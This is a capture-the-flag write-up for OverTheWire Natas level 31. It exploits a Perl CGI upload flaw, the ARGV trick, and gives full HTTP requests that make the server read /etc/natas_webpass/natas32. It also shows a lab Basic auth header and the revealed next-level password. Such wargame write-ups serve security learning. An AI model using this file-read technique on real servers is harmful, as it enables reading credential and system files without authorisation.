- This level relies on the vulnerability of `$cgi->upload('file')` method. It was also discussed in Perl Jam 2016
- Essentially, this level has a RFI (Remote File Inclusion) vulnerability which we need to exploit
- The vulnerability lies in the fact that if we submit the form data with two files (the other one being just a malicious bit of code), the first one would be picked up
- Also, if the content of the file is just `ARGV`, then it could also cause remote code execution if we open a pipe by using the `|` character
- So to solve this level, we simply prepare a test payload (It could be anything) and upload it, then intercept it in BurpSuite
- The request should look like this:
```http
POST /index.pl HTTP/1.1
Host: natas31.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------1908431803793511201489441935
Content-Length: 479
Origin: http://natas31.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Connection: keep-alive
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------1908431803793511201489441935
Content-Disposition: form-data; name="file"; filename="test.pl"
Content-Type: text/csv

#!/usr/bin/perl
print $ENV{"TMPDIR"}
-----------------------------1908431803793511201489441935
Content-Disposition: form-data; name="submit"

Upload
-----------------------------1908431803793511201489441935--
```
- Now we can copy the same file markers from the upload data and put `ARGV` in it. Then we supply the file name which we want to include in our server side code as query parameter, like this:
```http
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------1908431803793511201489441935
Content-Length: 479
Origin: http://natas31.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Connection: keep-alive
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------1908431803793511201489441935
Content-Disposition: form-data; name="file";

ARGV
-----------------------------1908431803793511201489441935
Content-Disposition: form-data; name="file"; filename="test.pl"
Content-Type: text/csv

#!/usr/bin/perl
print $ENV{"TMPDIR"}
-----------------------------1908431803793511201489441935
Content-Disposition: form-data; name="submit"

Upload
-----------------------------1908431803793511201489441935--
```
- Doing this includes the password file which we want, and we get the following output:
```html
<div id="content">
	<table class="sortable table table-hover table-striped">
		<tr>
			<th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B</th>
		</tr>
	</table>
<div id="viewsource">
	<a href="index-source.html">View sourcecode</a></div>
</div>
```
- This is the required password for us: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B